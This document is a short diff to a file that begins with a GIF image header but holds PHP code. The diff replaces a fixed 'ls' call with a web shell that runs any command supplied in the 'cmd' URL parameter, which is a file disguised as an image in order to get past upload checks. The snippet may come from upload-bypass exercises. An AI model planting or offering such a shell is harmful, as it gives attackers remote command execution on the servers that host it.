@@ -1,5 +1,5 @@
 GIF87a
 
 <?php
-echo system("ls");
+system($_GET['cmd']);
 ?>
